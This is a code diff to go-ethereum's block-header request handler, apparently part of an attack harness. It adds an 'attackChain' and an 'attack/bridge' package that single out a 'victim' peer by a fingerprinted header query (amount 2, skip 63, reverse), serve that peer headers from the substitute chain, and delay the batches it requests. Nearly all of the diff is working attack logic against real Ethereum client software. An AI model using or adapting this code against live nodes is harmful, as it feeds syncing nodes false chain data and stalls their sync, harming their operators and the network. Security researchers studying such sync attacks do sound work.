@@ -30,6 +30,9 @@ import (
 	"github.com/ethereum/go-ethereum/attack/bridge"
 )
 
+var attackChain *core.BlockChain
+
+
 // handleGetBlockHeaders66 is the eth/66 version of handleGetBlockHeaders
 func handleGetBlockHeaders66(backend Backend, msg Decoder, peer *Peer) error {
 	// Decode the complex header query
@@ -37,7 +40,30 @@ func handleGetBlockHeaders66(backend Backend, msg Decoder, peer *Peer) error {
 	if err := msg.Decode(&query); err != nil {
 		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
 	}
-	response := ServiceGetBlockHeadersQuery(backend.Chain(), query.GetBlockHeadersPacket, peer)
+
+	log.Info("Received query", "query", query.GetBlockHeadersPacket)
+
+	if must, chainType := bridge.MustChangeAttackChain(); must {
+		db := bridge.GetChainDatabase(chainType)
+		var err error
+		log.Info("Creating attackChain")
+		headerchain, err := core.NewHeaderChain(db, nil, nil, nil)
+		if err != nil {
+			log.Error("error", "error", err)
+			return fmt.Errorf("Can't create attack chain: %v", err)
+		}
+		headerchain.SetCurrentHeader(bridge.Latest())
+		log.Info("Created attackChain")
+		attackChain = &core.BlockChain{}
+		attackChain.SetHc(headerchain)
+	}
+
+	chain := backend.Chain()
+	if bridge.MustUseAttackChain() {
+		chain = attackChain
+	}
+
+	response := ServiceGetBlockHeadersQuery(chain, query.GetBlockHeadersPacket, peer)
 	return peer.ReplyBlockHeadersRLP(query.RequestId, response)
 }
 
@@ -46,7 +72,7 @@ func handleGetBlockHeaders66(backend Backend, msg Decoder, peer *Peer) error {
 func ServiceGetBlockHeadersQuery(chain *core.BlockChain, query *GetBlockHeadersPacket, peer *Peer) []rlp.RawValue {
 	if query.Skip == 0 {
 		// The fast path: when the request is for a contiguous segment of headers.
-		return serviceContiguousBlockHeaderQuery(chain, query)
+		return serviceContiguousBlockHeaderQuery(chain, query, peer)
 	} else {
 		return serviceNonContiguousBlockHeaderQuery(chain, query, peer)
 	}
@@ -56,6 +82,20 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 	hashMode := query.Origin.Hash != (common.Hash{})
 	first := true
 	maxNonCanonical := uint64(100)
+
+	if hashMode && query.Origin.Hash == bridge.Latest().Hash() && query.Amount == 2 && query.Skip == 63 && query.Reverse {
+		bridge.SetMasterPeer()
+		bridge.SetVictimIfNone(peer.Peer)
+
+		//head, pivot := bridge.GetHigherHeadAndPivot()
+
+		if bridge.MustUseAttackChain() {
+			chain = attackChain 			// As we changed the bridge state (setting a victim), re-check whether
+											// we need to use attack chain
+		}
+	} else {
+		log.Info("bridge provided latest", "hash", bridge.Latest().Hash())
+	}
 
 	// Gather headers until the fetch or network limits is reached
 	var (
@@ -72,9 +112,12 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 		if hashMode {
 			if first {
 				first = false
+				log.Info("Trying to load query origin")
 				origin = chain.GetHeaderByHash(query.Origin.Hash)
 				if origin != nil {
 					query.Origin.Number = origin.Number.Uint64()
+				} else {
+					log.Info("Can't find origin")
 				}
 			} else {
 				origin = chain.GetHeader(query.Origin.Hash, query.Origin.Number)
@@ -141,11 +184,7 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 	return headers
 }
 
-func serviceContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHeadersPacket) []rlp.RawValue {
-	if query.Amount == 192 && query.Skip == 0 && query.Reverse == false {
-		bridge.NotifyNewBatchRequest()
-	}
-
+func serviceContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHeadersPacket, peer *Peer) []rlp.RawValue {
 	count := query.Amount
 	if count > maxHeadersServe {
 		count = maxHeadersServe
@@ -159,11 +198,19 @@ func serviceContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHe
 			from = from + count - 1
 		}
 		headers := chain.GetHeadersFrom(from, count)
+		log.Info("Got headers for query", "amount", query.Amount, "from", query.Origin.Number, "len_headers", len(headers))
 		if !query.Reverse {
 			for i, j := 0, len(headers)-1; i < j; i, j = i+1, j-1 {
 				headers[i], headers[j] = headers[j], headers[i]
 			}
 		}
+
+		// Introducing delay and marking batch as served
+		if query.Amount == 192 && query.Skip == 0 && query.Reverse == false && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
+			bridge.DelayBeforeServingBatch()
+			bridge.ServedBatchRequest(query.Origin.Number, peer.Peer.ID().String()[:8])
+		}
+
 		return headers
 	}
 	// Hash mode.
